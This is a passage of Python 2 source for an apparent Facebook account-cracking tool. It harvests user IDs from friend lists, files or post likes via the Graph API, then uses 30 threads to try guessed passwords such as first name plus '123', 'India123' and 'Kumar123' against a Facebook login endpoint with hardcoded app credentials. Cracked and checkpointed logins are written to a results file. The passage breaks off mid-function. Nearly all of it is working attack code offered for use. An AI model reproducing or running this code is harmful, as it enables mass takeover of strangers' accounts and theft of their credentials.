    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mdone/indo.txt'
    print '\x1b[1;96m--------------------------------------------------'
    raw_input('\x1b[1;97m[<\x1b[1;93mBack\x1b[1;97m>]')
    menu()


def crack_india():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m]\x1b[1;92m Crack From Friend list'
    print '\x1b[1;97m[\x1b[1;93m02\x1b[1;97m]\x1b[1;92m Crack From Public Frendlist'
    print '\x1b[1;97m[\x1b[1;93m03\x1b[1;97m]\x1b[1;92m Crack From File'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;91m Back'
    print '\x1b[1;96m--------------------------------------------------'
    pilih_india()


def pilih_india():
    teak = raw_input('\x1b[1;91mChoose Any Option \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
        pilih_india()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mID Public/friend \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID public / friend does not exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Internet Conection!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mName File\x1b[1;91m :\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File does not exist ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File does not exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                crack_india()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
            pilih_india()
        print '\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mStop Tekan CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mCrack Start ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\x1b[1;96m--------------------------------------------------'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mUse Airplane Mode If Nothing Is Working'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mCheckpoint Account Open After 7 days'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95m Crated By : Angga Kurniawan'
    print '\x1b[1;96m--------------------------------------------------'

    def main(arg):
        sys.stdout.write(('\r[]').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'India123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Kalimata123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Kumar123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mFinished ...'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mdone/indo.txt'
    print '\x1b[1;96m--------------------------------------------------'
    raw_input('\x1b[1;97m[<\x1b[1;93mBack\x1b[1;97m>]')
    menu()


def crack_likes():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    try:
        os.system('clear')
        print logo
        tez = raw_input('\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m]\x1b[1;96m ID Postingan Group/Friend \x1b[1;91m :\x1b[1;92m ')
        r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

        jalan('\r\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m] \x1b[1;96mTake ID \x1b[1;97m...')
    except KeyError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID Incorrect Post !'
        raw_input('\n\x1b[1;96m[<\x1b[1;97mBack>\x1b[1;96m]')
        menu()

    print '\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m] \x1b[1;96mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m] \x1b[1;96mStop Tekan CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;96m\xe2\x97\x8f\x1b[1;97m] \x1b[1;96mCrack Starting ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;96m--------------------------------------------------'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mUse Airplane Mode If Nothing Is Working'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mCheckpoint Account Open After 7 days'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95m Crated By : Angga Kurniawan'
    print '\x1b[1;96m--------------------------------------------------'

    def main(arg):
        sys.stdout.write(('\r[]').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
